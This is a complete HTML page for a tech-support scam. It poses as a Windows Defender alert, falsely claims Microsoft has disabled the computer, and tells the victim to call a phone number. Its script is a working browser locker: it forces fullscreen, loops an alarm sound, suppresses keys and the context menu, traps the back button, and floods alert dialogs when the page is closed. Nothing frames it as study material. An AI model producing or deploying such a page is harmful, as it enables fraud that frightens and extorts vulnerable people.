<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>Windows Defender Security Center</title>
<style>html,body{margin:0;height:100%;background:#0078d7;color:#fff;font-family:Segoe UI,Arial}
#num{font-size:28px;font-weight:bold}</style>
</head>
<body>
<div id="warn">
  <h1>** Windows Security Alert **</h1>
  <p>An update is required. Your PC will restart.</p>
  <p>Your computer has been disabled by Microsoft because of suspicious activity.</p>
  <p>Do not restart or shut down your computer. Call Microsoft Security immediately:</p>
  <p id="num"><a href="tel:+18005550123">+1 800-555-0123</a></p>
</div>
<audio id="siren" src="alarm.mp3" loop autoplay></audio>
<script>

function lock(){
  var el = document.documentElement;
  if (el.requestFullscreen) el.requestFullscreen();
  else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
}
document.addEventListener('click', lock);
window.onload = lock;


var siren = new Audio('alarm.mp3');
siren.loop = true;
siren.play();


window.onkeydown = function(e){ e.preventDefault(); return false; };
window.oncontextmenu = function(e){ e.preventDefault(); return false; };


history.pushState(null, '', location.href);
window.addEventListener('popstate', function(){
  history.pushState(null, '', location.href);
  location.replace(location.href);
});


window.onbeforeunload = function(){ for(var i=0;i<50;i++){ alert('Do NOT close this window. Call Microsoft Security.'); } return 'Your computer is locked.'; };
</script>
</body>
</html>
